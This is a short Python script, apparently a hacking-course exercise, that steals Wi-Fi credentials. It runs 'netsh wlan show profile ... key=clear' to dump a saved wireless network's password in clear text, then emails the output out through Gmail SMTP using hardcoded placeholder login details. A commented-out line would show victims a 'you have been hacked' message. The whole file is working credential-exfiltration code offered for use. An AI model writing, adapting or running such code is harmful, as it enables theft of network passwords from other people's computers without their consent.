#!/usr/bin/env python

import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#command = "%SystemRoot%\Sysnative\msg.exe * you have been hacked"
command = "netsh wlan show profile UPC723762 key=clear"
#subprocess.Popen(command, shell=True)
result = subprocess.check_output(command, shell=True)
send_mail("my_email@gmail.com", "abc123", result)